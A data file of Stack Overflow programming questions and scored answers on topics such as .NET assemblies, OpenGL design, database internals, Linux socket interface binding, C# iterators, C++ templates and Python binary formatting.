{"title": "Understanding dlls and how they work in Visual Studio", "description": "Does anyone have a good resource on dlls and how they are used / generated in Visual Studio?  A few questions I'm rather hazy on specifically are:\n\nHow refresh files work\nHow dll version numbers are generated\nThe difference between adding a reference by project vs browsing for the specific dll\n\nAny other tips are welcome as well.\n", "answer": ".NET DLL's\nThe general term for a .NET DLL is an assembly. They are a single atomic unit of deployment and consist of one or more CLR 'modules' (for most developers usually just one unless they are combining compiler output from two or more languages for example). Assemblies contain both CIL code and CLR metadata such as the assembly manifest. \n.refresh Files\n.refresh files are simply text files that tell VS where to check for new builds of referenced dll's. They are used in file based web projects where there isn't a project file to store this info.\nVersion Numbers\n.NET Assembly version numbers are generated by an assembly scoped attribute AssemblyVersion which is usually found in a source file named 'AssemblyInfo.cs' (found under a project folder named 'Properties' from VS2005 onwards). Version numbers are comprised of major.minor.build.revision, for example -\n[assembly: AssemblyVersion(\"1.0.0.0\")]\nAssemblyVersion is used as part of an assembly's identity (i.e. in its strong name) and plays an important role in the binding process and during version policy decisions.\nFor example if I had two assemblies of the same name in the GAC then the AssemblyVersion attribute would differentiate them for the purposes of loading a specific version of the assembly.\nAssemblyVersion number can be fixed and incremented manually or you can allow the compiler to generate the build and revision numbers for you by specifying:\n[assembly: AssemblyVersion(\"1.0.*\")]  - generates build and revision number\n[assembly: AssemblyVersion(\"1.0.0.*\")] - generates revision number\nIf the AssemblyVersion attribute is not present then the version number default to '0.0.0.0'.\nThe value of the AssemblyVersion attribute becomes part of an assembly's manifest, the AssemblyFileVersion attribute value does not.\nThe AssemblyFileVersion attribute is used to embed a Win32 file version into the DLL. If this is not present then AssemblyVersion is used. It has no bearing on how the .NET assembly loader/resolver chooses which version of an assembly to load. \nProject References vs Browsing For DLL\nIf you're adding a project reference it means that the referenced project will be part of your solution. This makes debugging simpler by being able to step directly into your referenced project's code. If you only add a dll reference then you don't have the benefits of the project being part of the solution and being able to step into the code within the solution.\n", "score": 10}
{"title": "What are some best practices for OpenGL coding (esp. w.r.t. object orientation)?", "description": "This semester, I took a course in computer graphics at my University. At the moment, we're starting to get into some of the more advanced stuff like heightmaps, averaging normals, tesselation etc.\nI come from an object-oriented background, so I'm trying to put everything we do into reusable classes. I've had good success creating a camera class, since it depends mostly on the one call to gluLookAt(), which is pretty much independent of the rest of the OpenGL state machine.\nHowever, I'm having some trouble with other aspects. Using objects to represent primitives hasn't really been a success for me. This is because the actual render calls depend on so many external things, like the currently bound texture etc. If you suddenly want to change from a surface normal to a vertex normal for a particular class it causes a severe headache.\nI'm starting to wonder whether OO principles are applicable in OpenGL coding. At the very least, I think that I should make my classes less granular.\nWhat is the stack overflow community's views on this? What are your best practices for OpenGL coding?\n", "answer": "The most practical approach seems to be to ignore most of OpenGL functionality that is not directly applicable (or is slow, or not hardware accelerated, or is a no longer a good match for the hardware).\nOOP or not, to render some scene those are various types and entities that you usually have:\nGeometry (meshes). Most often this is an array of vertices and array of indices (i.e. three indices per triangle, aka \"triangle list\"). A vertex can be in some arbitrary format (e.g. only a float3 position; a float3 position + float3 normal; a float3 position + float3 normal + float2 texcoord; and so on and so on). So to define a piece of geometry you need:\n\ndefine it's vertex format (could be a bitmask, an enum from a list of formats; ...), \nhave array of vertices, with their components interleaved (\"interleaved arrays\")\nhave array of triangles.\n\nIf you're in OOP land, you could call this class a Mesh.\nMaterials - things that define how some piece of geometry is rendered. In a simplest case, this could be a color of the object, for example. Or whether lighting should be applied. Or whether the object should be alpha-blended. Or a texture (or a list of textures) to use. Or a vertex/fragment shader to use. And so on, the possibilities are endless. Start by putting things that you need into materials. In OOP land that class could be called (surprise!) a Material.\nScene - you have pieces of geometry, a collection of materials, time to define what is in the scene. In a simple case, each object in the scene could be defined by:\n - What geometry it uses (pointer to Mesh),\n - How it should be rendered (pointer to Material),\n - Where it is located. This could be a 4x4 transformation matrix, or a 4x3 transformation matrix, or a vector (position), quaternion (orientation) and another vector (scale). Let's call this a Node in OOP land.\nCamera. Well, a camera is nothing more than \"where it is placed\" (again, a 4x4 or 4x3 matrix, or a position and orientation), plus some projection parameters (field of view, aspect ratio, ...).\nSo basically that's it! You have a scene which is a bunch of Nodes which reference Meshes and Materials, and you have a Camera that defines where a viewer is.\nNow, where to put actual OpenGL calls is a design question only. I'd say, don't put OpenGL calls into Node or Mesh or Material classes. Instead, make something like OpenGLRenderer that can traverse the scene and issue all calls. Or, even better, make something that traverses the scene independent of OpenGL, and put lower level calls into OpenGL dependent class.\nSo yes, all of the above is pretty much platform independent. Going this way, you'll find that glRotate, glTranslate, gluLookAt and friends are quite useless. You have all the matrices already, just pass them to OpenGL. This is how most of real actual code in real games/applications work anyway.\nOf course the above can be complicated by more complex requirements. Particularly, Materials can be quite complex. Meshes usually need to support lots of different vertex formats (e.g. packed normals for efficiency). Scene Nodes might need to be organized in a hierarchy (this one can be easy - just add parent/children pointers to the node). Skinned meshes and animations in general add complexity. And so on.\nBut the main idea is simple: there is Geometry, there are Materials, there are objects in the scene. Then some small piece of code is able to render them.\nIn OpenGL case, setting up meshes would most likely create/activate/modify VBO objects. Before any node is rendered, matrices would need to be set. And setting up Material would touch most of remaining OpenGL state (blending, texturing, lighting, combiners, shaders, ...).\n", "score": 74}
{"title": "How do databases work internally?", "description": "I've been working with databases for the last few years and I'd like to think that I've gotten fairly competent with using them. However I was reading recently about Joel's  Law of Leaky Abstractions and I realised that even though I can write a query to get pretty much anything I want out of a database, I have no idea how the database actually interprets the query. Does anyone know of any good articles or books that explain how databases work internally?\nSome specific things I'm interested in are:\n\nWhat does a database actually do to find out what matches a select statement?\nHow does a database interpret a join differently to a query with several \"where key1 = key2\" statements?\nHow does the database store all its memory?\nHow are indexes stored?\n\n", "answer": "\nWhat does a database actually do to\n  find out what matches a select\n  statement?\n\nTo be blunt, it's a matter of brute force. Simply, it reads through each candidate record in the database and matches the expression to the fields. So, if you have \"select * from table where name = 'fred'\", it literally runs through each record, grabs the \"name\" field, and compares it to 'fred'.\nNow, if the \"table.name\" field is indexed, then the database will (likely, but not necessarily) use the index first to locate the candidate records to apply the actual filter to.\nThis reduces the number of candidate records to apply the expression to, otherwise it will just do what we call a \"table scan\", i.e. read every row.\nBut fundamentally, however it locates the candidate records is separate from how it applies the actual filter expression, and, obviously, there are some clever optimizations that can be done.\n\nHow does a database interpret a join\n  differently to a query with several\n  \"where key1 = key2\" statements?\n\nWell, a join is used to make a new \"pseudo table\", upon which the filter is applied. So, you have the filter criteria and the join criteria. The join criteria is used to build this \"pseudo table\" and then the filter is applied against that. Now, when interpreting the join, it's again the same issue as the filter -- brute force comparisons and index reads to build the subset for the \"pseudo table\".\n\nHow does the database store all its\n  memory?\n\nOne of the keys to good database is how it manages its I/O buffers. But it basically matches RAM blocks to disk blocks. With the modern virtual memory managers, a simpler database can almost rely on the VM as its memory buffer manager. The high end DB'S do all this themselves.\n\nHow are indexes stored?\n\nB+Trees typically, you should look it up. It's a straight forward technique that has been around for years. It's benefit is shared with most any balanced tree: consistent access to  the nodes, plus all the leaf nodes are linked so you can easily traverse from node to node in key order. So, with an index, the rows can be considered \"sorted\" for specific fields in the database, and the database can leverage that information to it benefit for optimizations. This is distinct from, say, using a hash table for an index, which only lets you get to a specific record quickly. In a B-Tree you can quickly get not just to a specific record, but to a point within a sorted list.\nThe actual mechanics of storing and indexing rows in the database are really pretty straight forward and well understood. The game is managing buffers, and converting SQL in to efficient query paths to leverage these basic storage idioms.\nThen, there's the whole multi-users, locking, logging, and transactions complexity on top of the storage idiom.\n", "score": 87}
{"title": "Using Linux, how to specify which ethernet interface data is transmitted on", "description": "I'm working on a Linux based server system in which there are two network interfaces, both on the same subnet (for now, lets just say they are 172.17.32.10 & 172.17.32.11).  When I send data to a host on the network, I would like to specify which interface on my server the data is transmitted on.  I need to be able to switch from one interface to the other (or maybe even transmit on both) in software (static routing rules won't work for this application).\nI found a related question in StackOverflow that suggested using the netlink library to modify routes on the fly.  This intuitively seems like it should work, but I was wondering if there were any other options to accomplish this same result.\n", "answer": "No offense intended, but the answer about using bind() is quite wrong. bind() will control the source IP address placed within the packet IP header. It does not control which interface will be used to send the packet: the kernel's routing table will be consulted to determine which interface has the lowest cost to reach a particular destination. (*see note)\nInstead, you should use an SO_BINDTODEVICE sockopt. This does two things:\n\nPackets will always egress from the interface you specified, regardless of what the kernel routing tables says.\nOnly packets arriving on the specified interface will be handed to the socket. Packets arriving on other interfaces will not.\n\nIf you have multiple interfaces you want to switch between, I'd suggest creating one socket per interface. Because you'll also only receive packets to the interface you've bound to, you'll need to add all of these sockets to your select()/poll()/whatever you use.\n#include <net/if.h>\n\nstruct ifreq ifr;\n\nmemset(&ifr, 0, sizeof(ifr));\nstrncpy(ifr.ifr_name, \"eth1\", sizeof(ifr.ifr_name));\nif (setsockopt(s, SOL_SOCKET, SO_BINDTODEVICE,\n            (void *)&ifr, sizeof(ifr)) < 0) {\n    perror(\"SO_BINDTODEVICE failed\");\n}\n\n(*note)\nBind() to an interface IP address can lead to confusing but nonetheless correct behavior. For example if you bind() to the IP address for eth1, but the routing table sends the packet out eth0, then a packet will appear on the eth0 wire but carrying the source IP address of the eth1 interface. This is weird but allowed, though packets sent back to the eth1 IP address would be routed back to eth1. You can test this using a Linux system with two iP interfaces. I have one, and did test it, and bind() is not effective in steering the packet out a physical interface.\nThough technically allowed, depending on topology this may nonetheless not work. To dampen distributed denial of service attacks where the attackers use forged IP source addresses, many routers now perform Reverse Path Forwarding (RPF) checks. Packets with a source IP address on the \"wrong\" path may be dropped.\n", "score": 18}
{"title": "Getting the schema for a table", "description": "Given an SQLConnection object how can you get a schema for a single table?\nI seemed to be able to get the schema from a DataSet which I'd gotten from running a query, but all the schema info I could get from the connection seemed to be related to what tables were available and not the actual details on the tables.\n", "answer": "This code will do what you want (obviously change the table name, server name etc):\nusing System;\nusing System.Collections.Generic;\nusing System.Text;\n\nusing System.Data;\nusing System.Data.SqlClient;\nusing System.Data.SqlTypes;\n\nnamespace ConsoleApp\n{\n    class Program\n    {\n        static void Main(string[] args)\n        {\n            string query = \"SELECT * FROM t where 1=0\";\n            string connectionString = \"initial catalog=test;data source=localhost;Trusted_Connection=Yes\";\n\n            DataTable tblSchema;\n\n            using (SqlConnection cnn = new SqlConnection(connectionString))\n            {\n                using (SqlCommand cmd = cnn.CreateCommand())\n                {\n                    cmd.CommandText = query;\n                    cmd.CommandType = CommandType.Text;\n                    cnn.Open();\n                    using (SqlDataReader rdr = cmd.ExecuteReader(CommandBehavior.KeyInfo))\n                    {\n                        tblSchema = rdr.GetSchemaTable();\n                    }\n                    cnn.Close();\n                }\n            }\n            int numColumns = tblSchema.Columns.Count;\n            foreach (DataRow dr in tblSchema.Rows)\n            {\n                Console.WriteLine(\"{0}: {1}\", dr[\"ColumnName\"], dr[\"DataType\"]);\n            }\n\n            Console.ReadLine();\n        }\n    }\n}\n\n", "score": 10}
{"title": "What is the preferred way to do a CSS rollover?", "description": "When setting up a rollover effect in HTML, are there any benefits (or pitfalls) to doing it in CSS vs. JavaScript?  Are there any performance or code maintainability issues I should be aware of with either approach?\n", "answer": "CSS is fine for rollovers. They're implemented basically using the :hover pseudo-selector. Here's a really simple implementation:\na{\n    background-image: url(non-hovered-state.png);\n}\na:hover{\n    background-image: url(hovered-state.png);\n}\n\nThere are a few things you need to be aware of though:\n\nIE6 only supports :hover on <a> tags\nImages specified in CSS but not used on the page won't be loaded immediately (meaning the rollover state can take a second to appear first time)\n\nThe <a>-tags-only restriction is usually no problem, as you tend to want rollovers clickable. The latter however is a bit more of an issue. There is a technique called CSS Sprites that can prevent this problem, you can find an example of the technique in use to make no-preload rollovers. \nIt's pretty simple, the core principle is that you create an image larger than the element, set the image as a background image, and position it using background-position so only the bit you want is visible. This means that to show the hovered state, you just need to reposition the background - no extra files need to be loaded at all. Here's a quick-and-dirty example (this example assumes you have an element 20px high, and a background image containing both the hovered and non-hovered states - one on top of the other (so the image is 40px high)):\na{\n    background-image: url(rollover-sprites.png);\n    background-position: 0 0; /* Added for clarity */\n    height: 20px;\n}\na:hover{\n    background-position: 0 -20px; /* move the image up 20px to show the hovered state below */\n}\n\nNote that using this 'sprites' technique means that you will be unable to use alpha-transparent PNGs with IE6 (as the only way IE6 has to render alpha-transparent PNGs properly uses a special image filter which don't support background-position)\n", "score": 25}
{"title": "Algorithm for implementing C# yield statement", "description": "I'd love to figure it out myself but I was wondering roughly what's the algorithm for converting a function with yield statements into a state machine for an enumerator? For example how does C# turn this:\nIEnumerator<string> strings(IEnumerable<string> args)\n { IEnumerator<string> enumerator2 = getAnotherEnumerator();     \n   foreach(var arg in arg) \n    { enumerator2.MoveNext();\n      yield return arg+enumerator.Current;\n    } \n }\n\ninto this:\nbool MoveNext()\n { switch (this.state)\n    {\n        case 0:\n            this.state = -1;\n            this.enumerator2 = getAnotherEnumerator();\n            this.argsEnumerator = this.args.GetEnumerator();\n            this.state = 1;\n            while (this.argsEnumerator.MoveNext())\n            {\n                this.arg = this.argsEnumerator.Current;\n                this.enumerator2.MoveNext();\n                this.current = this.arg + this.enumerator2.Current;\n                this.state = 2;\n                return true;\n\n              state1:\n                this.state = 1;\n            }\n            this.state = -1;\n            if (this.argsEnumerator != null) this.argsEnumerator.Dispose();\n            break;\n\n        case 2:\n            goto state1;\n    }\n    return false;\n}\n\nOf course the result can be completely different depending on the original code.\n", "answer": "The particular code sample you are looking at involves a series of transformations.\nPlease note that this is an approximate description of the algorithm. The actual names used by the compiler and the exact code it generates may be different. The idea is the same, however.\nThe first transformation is the \"foreach\" transformation, which transforms this code:\nforeach (var x in y)\n{\n   //body\n}\n\ninto this code:\nvar enumerator = y.GetEnumerator();\nwhile (enumerator.MoveNext())\n{\n    var x = enumerator.Current;\n    //body\n}\n\nif (y != null)\n{\n    enumerator.Dispose();\n}\n\nThe second transformation finds all the yield return statements in the function body, assigns a number to each (a state value), and creates a \"goto label\" right after the yield. \nThe third transformation lifts all the local variables and function arguments in the method body into an object called a closure. \nGiven the code in your example, that would look similar to this:\n class ClosureEnumerable : IEnumerable<string>\n {\n    private IEnumerable<string> args;\n    private ClassType originalThis;\n    public ClosureEnumerator(ClassType origThis, IEnumerable<string> args)\n    {\n        this.args = args;\n        this.origianlThis = origThis;\n    }\n    public IEnumerator<string> GetEnumerator()\n    {\n        return new Closure(origThis, args);\n    }\n }\n\nclass Closure : IEnumerator<string>\n{\n    public Closure(ClassType originalThis, IEnumerable<string> args)\n    {\n        state = 0;\n        this.args = args;\n        this.originalThis = originalThis;\n    }\n\n    private IEnumerable<string> args;\n    private IEnumerator<string> enumerator2;\n    private IEnumerator<string> argEnumerator;\n\n    //- Here ClassType is the type of the object that contained the method\n    //  This may be optimized away if the method does not access any \n    //  class members\n    private ClassType originalThis;\n\n    //This holds the state value.\n    private int state;\n    //The current value to return\n    private string currentValue;\n\n    public string Current\n    {\n        get \n        {\n            return currentValue;\n        }\n    }\n}\n\nThe method body is then moved from the original method to a method inside \"Closure\" called MoveNext, which returns a bool, and implements IEnumerable.MoveNext.\nAny access to any locals is routed through \"this\", and any access to any class members are routed through this.originalThis.\nAny \"yield return expr\" is translated into:\ncurrentValue = expr;\nstate = //the state number of the yield statement;\nreturn true;\n\nAny yield break statement is translated into:\nstate = -1;\nreturn false;\n\nThere is an \"implicit\" yield break statement at the end of the function.\nA switch statement is then introduced at the beginning of the procedure that looks at the state number and jumps to the associated label. \nThe original method is then translated into something like this:\nIEnumerator<string> strings(IEnumerable<string> args)\n{\n   return new ClosureEnumerable(this,args);\n}\n\nThe fact that the state of the method is all pushed into an object and that the MoveNext method uses a switch statement / state variable is what allows the iterator to behave as if control is being passed back to the point immediately after the last \"yield return\" statement the next time \"MoveNext\" is called.\nIt is important to point out, however, that the transformation used by the C# compiler is not the best way to do this. It suffers from poor performance when trying to use \"yield\" with recursive algorithms. There is a good paper that outlines a better way to do this here:\nhttp://research.microsoft.com/en-us/projects/specsharp/iterators.pdf\nIt's worth a read if you haven't read it yet.\n", "score": 60}
{"title": "Iterators.. why use them?", "description": "In the STL library some containers have iterators and it is commonly held that they are a superior way of iterating through these containers rather than simple for loops e.g.\nfor ( int i=0; i < vecVector.size(); i++ )\n{\n\n..\n\n}\n\nCan anyone tell me why and in what cases I should use iterators and in what cases the code snippet above please?\n", "answer": "Note that the usually implementation of vector won't use an \"int\" as the type of the index/size. So your code will at the very least provoke compiler warnings.\nGenericity\nIterators increase the genericity of your code.\nFor example:\ntypedef std::vector<int> Container ;\n\nvoid doSomething(Container & p_aC)\n{\n    for(Container::iterator it = p_aC.begin(), itEnd = p_aC.end(); it != itEnd; ++it)\n    {\n       int & i = *it ; // i is now a reference to the value iterated\n       // do something with \"i\"\n    }\n}\n\nNow, let's imagine you change the vector into a list (because in your case, the list is now better). You only need to change the typedef declaration, and recompile the code.\nShould you have used index-based code instead, it would have needed to be re-written.\nAccess\nThe iterator should be viewed like a kind of super pointer.\nIt \"points\" to the value (or, in case of maps, to the pair of key/value).\nBut it has methods to move to the next item in the container. Or the previous. Some containers offer even random access (the vector and the deque).\nAlgorithms\nMost STL algorithms work on iterators or on ranges of iterators (again, because of genericity). You won't be able to use an index, here.\n", "score": 28}
{"title": "Is object code generated for unused template class methods?", "description": "I have a C++ template class that gets instantiated with 3 different type parameters. There's a method that the class needs to have for only one of those types and that isn't ever called with the two other types.\nWill object code for that method be generated thrice (for all types for which the template is instantiated), or is object code generated only once (for the type with which it is actually used)?\n", "answer": "Virtual member functions are instantiated when a class template is instantiated, but non-virtual member functions are instantiated only if they are called.\nThis is covered in [temp.inst] in the C++ standard (In C++11, this is §14.7.1/10. In C++14, it is §14.7.1/11, and in C++17 it is §17.7.1/9. Excerpt from C++17 below)\n\nAn implementation shall not implicitly instantiate a function template, a variable template, a member\n  template, a non-virtual member function, a member class, a static data member of a class template, or\n  a substatement of a constexpr if statement (9.4.1), unless such instantiation is required\n\nAlso note that it is possible to instantiate a class template even if some of the member functions are not instantiable for the given template parameters.  For example:\ntemplate <class T>\nclass Xyzzy\n{\npublic:\n    void CallFoo() { t.foo(); }  // Invoke T::foo()\n    void CallBar() { t.bar(); }  // Invoke T::bar()\n\nprivate:\n    T t;\n};\n\nclass FooBar\n{\npublic:\n    void foo() { ... }\n    void bar() { ... }\n};\n\nclass BarOnly\n{\npublic:\n    void bar() { ... }\n};\n\nint main(int argc, const char** argv)\n{\n    Xyzzy<FooBar>  foobar;    // Xyzzy<FooBar> is instantiated\n    Xyzzy<BarOnly> baronly;   // Xyzzy<BarOnly> is instantiated\n\n    foobar.CallFoo();         // Calls FooBar::foo()\n    foobar.CallBar();         // Calls FooBar::bar()\n\n    baronly.CallBar();        // Calls BarOnly::bar()\n\n    return 0;\n}\n\nThis is valid, even though Xyzzy::CallFoo() is not instantiable because there is no such thing as BarOnly::foo().  This feature is used often as a template metaprogramming tool.\nNote, however, that \"instantiation\" of a template does not directly correlate to how much object code gets generated.  That will depend upon your compiler/linker implementation.\n", "score": 25}
{"title": "What are the differences between the Builder, Factory Method, and Abstract Factory patterns?", "description": "A program receives a list of Messages (base type).  Each message in the list has to be processed according to it's type (descendant type).  However, different messages need different inputs in order to be processed correctly.\nWhat is the following technique called?  (I haven't checked this code in a compiler)\nabstract class MessageProcessor\n{\n    public static MessageProcessor GetProcessor(Message message, DataDomain data)\n    {\n        if (message.GetType() == typeof(FooMessage))\n        {\n            return new FooMessageProcessor(message, data.Name, data.Classification);\n\n        }\n        else if (message.GetType() == typeof(BarMessage))\n        {\n            return new BarMessageProcessor(message, data.AccountNo, data.CreditLimit);\n\n        }\n        else\n            throw new SomeException(\"Unrecognized type\");\n\n    }\n\n    public abstract void Process();     \n}\n\nAnd this one?\nstatic class MessageProcessorFactory\n{\n    public static MessageProcessor GetProcessor(Message message, DataDomain data)\n    {\n        if (message.GetType() == typeof(FooMessage))\n        {\n            return new FooMessageProcessor(message, data.Name, data.Classification);\n\n        }\n        else if (message.GetType() == typeof(BarMessage))\n        {\n            return new BarMessageProcessor(message, data.AccountNo, data.CreditLimit);\n\n        }\n        else\n            throw new SomeException(\"Unrecognized type\");\n    }\n}\n\nAnd what is it called if I can inject the ProcessBuilder class into a MessageProcessor (using a property or Setter) and then call Process?\nWhat technique would be the best pattern for solving this problem?\n", "answer": "They are both examples of the factory method pattern. The only difference is that the second example has the method in its own static class. \nThis would be an example of the abstract factory pattern:\nabstract class MessageProcessorFactory\n { public abstract MessageProcessor GetProcessor\n                                     (Message message, DataDomain data);\n }\n\nclass FooMessageProcessorFactory :  MessageProcessorFactory\n { public override MessageProcessor GetProcessor\n                                     (Message message, DataDomain data)\n    { return new FooMessageProcessor(data.Name, data.Classification);\n    }\n }\n\nEach MessageProcessor gets its own factory class which makes use of polymorphism.\nPassing a ProcessBuilder to create the process would be the strategy pattern:\nclass MessageProcessor\n { ProcessBuilder builder;\n\n   public MessageProcessor(ProcessBuilder builder)\n    { this.builder = builder;\n    }\n\n   public void Process()\n    { builder.BuildMessage();\n      builder.BuildProcess();\n      builder.Process();\n    }\n }\n\nvar mp = new MessageProcessor(new FooProcessBuilder());\n\nThe simplest solution would be to encapsulate a factory method:\nstatic void Process(Message msg, DataDomain data)\n { var p = getProcessor(msg.GetType());\n   p.Process(msg, data);\n }\n\nIf it's a small known number of types, you can use the series of type checks:\nprivate static MessageProcessor getProcessor(Type msgType)\n { return   (msgType == typeof(FooMessage)) ? new FooMessageProcessor()\n          : (msgType == typeof(BarMessage)) ? new BarMessageProcessor()\n          :                                   new DefaultMessageProcessor();\n }\n\nOtherwise use a dictionary:\nDictionary<Type,MessageProcessor> processors;    \n\nprivate static MessageProcessor getProcessor(Type msgType) \n { return processors[msgType];\n }\n\n", "score": 10}
{"title": "What, exactly, distinguishes between private and protected (in Flex)?", "description": "In Flex (and many other languages) a function/method of a class can be declared private or protected (or public). What's the difference? I have the impression it has something to do with the relationship to child classes and how things are inherited or can be called, but I'm not sure what, exactly.\n", "answer": "In general:\n\nPrivate members can only be accessed\nby the class itself.\nProtected members can only be accessed by the class itself and its descendants.\nPublic members are accessible by everyone.\n\nThus, visibility increases as you go from private to protected to public.\nIn C++, you can control how the visibility of members should be inherited to the descendants by prepending the base class name with the private, protected or public keywords, meaning you want the visibility of the base class members to be at most at that level.\nclass A {\nprivate:\n    int privA;\nprotected:\n    int protA;\npublic:\n    int pubA;\n\n    // privA can be accessed inside class A\n    // protA can be accessed inside class A\n    // pubA  can be accessed inside class A\n};\n// pubA can be accessed by anyone\n\nclass B : public A {\n    // No change to visibility of members\n    // privA can't be accessed inside class B\n    // protA can be accessed inside class B\n    // pubA  can be accessed inside class B\n};\n// pubA can be accessed by anyone\n\nclass C : protected A {\n    // Public members downgraded to protected\n    // privA can't be accessed inside class C\n    // protA can be accessed inside class C\n    // pubA  can be accessed inside class C\n};\n// None of the members can be accessed outside class C\n\nclass D : private A {\n    // Public and protected members downgraded to private\n    // privA can't be accessed inside class D\n    // protA can't be accessed inside class D\n    // pubA  can't be accessed inside class D\n};\n// None of the members can be accessed outside class D\n\nIn each of the cases above, the descendant classes are of course able to introduce their own private, protected and public members.\n", "score": 11}
{"title": "What does the tilde before a function name mean in C#?", "description": "I am looking at some code and it has this statement:  \n~ConnectionManager()\n{\n    Dispose(false);\n}\n\nThe class implements the IDisposable interface, but I do not know if that is part of that the tilde(~) is used for.\n", "answer": "~ is the destructor\n\nDestructors are invoked automatically, and cannot be invoked explicitly.\nDestructors cannot be overloaded. Thus, a class can have, at most, one destructor.\nDestructors are not inherited. Thus, a class has no destructors other than the one, which may be declared in it.\nDestructors cannot be used with structs. They are only used with classes.\nAn instance becomes eligible for destruction when it is no longer possible for any code to use the instance.\nExecution of the destructor for the instance may occur at any time after the instance becomes eligible for destruction.\nWhen an instance is destructed, the destructors in its inheritance chain are called, in order, from most derived to least derived.\n\nFinalize \nIn C#, the Finalize method performs the operations that a standard C++ destructor would do. In C#, you don't name it Finalize -- you use the C++ destructor syntax of placing a tilde ( ~ ) symbol before the name of the class. \nDispose\nIt is preferable to dispose of objects in a Close() or Dispose() method that can be called explicitly by the user of the class. Finalize (destructor) are called by the GC.\nThe IDisposable interface tells the world that your class holds onto resources that need to be disposed and provides users a way to release them. If you do need to implement a finalizer in your class, your Dispose method should use the GC.SuppressFinalize() method to ensure that finalization of your instance is suppressed. \nWhat to use?\nIt is not legal to call a destructor explicitly. Your destructor will be called by the garbage collector. If you do handle precious unmanaged resources (such as file handles) that you want to close and dispose of as quickly as possible, you ought to implement the IDisposable interface.\n", "score": 237}
{"title": "Resources for Python Programmer", "description": "I have written a lot of code in Python, and I am very used to the syntax, object structure, and so forth of Python because of it.\nWhat is the best online guide or resource site to provide me with the basics, as well as a comparison or lookup guide with equivalent functions/features in VBA versus Python.\nFor example, I am having trouble equating a simple List in Python to VBA code. I am also have issues with data structures, such as dictionaries, and so forth.  \nWhat resources or tutorials are available that will provide me with a guide to porting python functionality to VBA, or just adapting to the VBA syntax from a strong OOP language background?\n", "answer": "VBA is quite different from Python, so you should read at least the \"Microsoft Visual Basic Help\" as provided by the application you are going to use (Excel, Access…).\nGenerally speaking, VBA has the equivalent of Python modules; they're called \"Libraries\", and they are not as easy to create as Python modules. I mention them because Libraries will provide you with higher-level types that you can use.\nAs a start-up nudge, there are two types that can be substituted for list and dict.\nlist\nVBA has the type Collection. It's available by default (it's in the library VBA). So you just do a\ndim alist as New Collection\nand from then on, you can use its methods/properties:\n\n.Add(item) ( list.append(item) ),\n.Count ( len(list) ),\n.Item(i) ( list[i] ) and\n.Remove(i) ( del list[i] ). Very primitive, but it's there.\n\nYou can also use the VBA Array type, which like python arrays are lists of same-type items, and unlike python arrays, you need to do ReDim to change their size (i.e. you can't just append and remove items)\ndict\nTo have a dictionary-like object, you should add the Scripting library to your VBA project¹. Afterwards, you can\nDim adict As New Dictionary\nand then use its properties/methods:\n\n.Add(key, item) ( dict[key] = item ),\n.Exists(key) ( dict.has_key[key] ),\n.Items() ( dict.values() ),\n.Keys() ( dict.keys() ),\nand others which you will find in the Object Browser².\n\n¹ Open VBA editor (Alt+F11). Go to Tools→References, and check the \"Microsoft Scripting Runtime\" in the list.\n² To see the Object Browser, in VBA editor press F2 (or View→Object Browser).\n", "score": 26}
{"title": "Base-2 (Binary) Representation Using Python", "description": "Building on How Do You Express Binary Literals in Python, I was thinking about sensible, intuitive ways to do that Programming 101 chestnut of displaying integers in base-2 form.  This is the best I came up with, but I'd like to replace it with a better algorithm, or at least one that should have screaming-fast performance.  \ndef num_bin(N, places=8):\n    def bit_at_p(N, p):\n        ''' find the bit at place p for number n '''\n        two_p = 1 << p   # 2 ^ p, using bitshift, will have exactly one\n                         # bit set, at place p\n        x = N & two_p    # binary composition, will be one where *both* numbers\n                         # have a 1 at that bit.  this can only happen \n                         # at position p.  will yield  two_p if  N has a 1 at \n                         # bit p\n        return int(x > 0)\n\n    bits =  ( bit_at_p(N,x) for x in xrange(places))\n    return \"\".join( (str(x) for x in bits) )\n\n    # or, more consisely \n    # return \"\".join([str(int((N & 1 << x)>0)) for x in xrange(places)])\n\n", "answer": "For best efficiency, you generally want to process more than a single bit at a time.\nYou can use a simple method to get a fixed width binary representation. eg.\ndef _bin(x, width):\n    return ''.join(str((x>>i)&1) for i in xrange(width-1,-1,-1))\n\n_bin(x, 8) will now give a zero padded representation of x's lower 8 bits.  This can be used to build a lookup table, allowing your converter to process 8 bits at a time (or more if you want to devote the memory to it).\n_conv_table = [_bin(x,8) for x in range(256)]\n\nThen you can use this in your real function, stripping off leading zeroes when returning it.  I've also added handling for signed numbers, as without it you will get an infinite loop (Negative integers conceptually have an infinite number of set sign bits.)\ndef bin(x):\n    if x == 0: \n        return '0' #Special case: Don't strip leading zero if no other digits\n    elif x < 0:\n        sign='-'\n        x*=-1\n    else:\n        sign = ''\n    l=[]\n    while x:\n        l.append(_conv_table[x & 0xff])\n        x >>= 8\n    return sign + ''.join(reversed(l)).lstrip(\"0\")\n\n[Edit] Changed code to handle signed integers.\n[Edit2] Here are some timing figures of the various solutions.  bin is the function above, constantin_bin is from Constantin's answer and num_bin is the original version.  Out of curiosity, I also tried a 16 bit lookup table variant of the above (bin16 below), and tried out Python3's builtin bin() function.  All timings were for 100000 runs using an 01010101 bit pattern.\nNum Bits:              8       16       32       64      128      256\n---------------------------------------------------------------------\nbin                0.544    0.586    0.744    1.942    1.854    3.357 \nbin16              0.542    0.494    0.592    0.773    1.150    1.886\nconstantin_bin     2.238    3.803    7.794   17.869   34.636   94.799\nnum_bin            3.712    5.693   12.086   32.566   67.523  128.565\nPython3's bin      0.079    0.045    0.062    0.069    0.212    0.201 \n\nAs you can see, when processing long values using large chunks really pays off, but nothing beats the low-level C code of python3's builtin (which bizarrely seems consistently faster at 256 bits than 128!).  Using a 16 bit lookup table improves things, but probably isn't worth it unless you really need it, as it uses up a large chunk of memory, and can introduce a small but noticalbe startup delay to precompute the table.\n", "score": 14}
